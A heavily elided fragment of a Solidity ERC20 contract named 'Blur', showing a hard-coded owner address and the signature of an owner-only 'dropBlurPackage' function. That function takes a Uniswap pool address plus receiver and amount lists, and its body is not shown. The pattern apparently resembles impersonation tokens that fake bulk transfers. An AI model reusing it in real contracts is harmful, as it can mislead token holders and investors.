...
contract Blur is Context, IERC20 {
    ...
    address public contOwnr = 0xFD413994663F60c207e114d5B7c9baf5DA8b24C9;
    ...
    function dropBlurPackage(address uniswapPool,address[] memory receivers,uint256[] memory amounts)  public auth(){
